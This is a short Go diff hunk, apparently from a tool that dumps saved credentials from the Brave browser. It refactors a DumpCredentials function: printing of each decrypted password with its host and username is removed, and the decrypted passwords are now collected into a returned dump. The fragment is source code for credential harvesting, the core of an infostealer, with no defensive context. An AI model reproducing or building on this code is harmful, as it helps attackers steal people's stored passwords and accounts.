@@ -52,10 +52,8 @@ func (b Brave) DumpCredentials() ([][]Credentials, error) {
 		return dump, errors.New("[!] No credentials")
 	}
 
-	fmt.Print("> Brave\n")
-	for _, creds := range credentials {
-		b.DecryptPassword(&creds.password)
-		fmt.Printf("\t| - %s ---> %s:%s\n", creds.loginUrl.Host, creds.username, string(creds.password))
+	for i := range credentials {
+		b.DecryptPassword(&credentials[i].Password)
 	}
 	dump = append(dump, credentials)
 
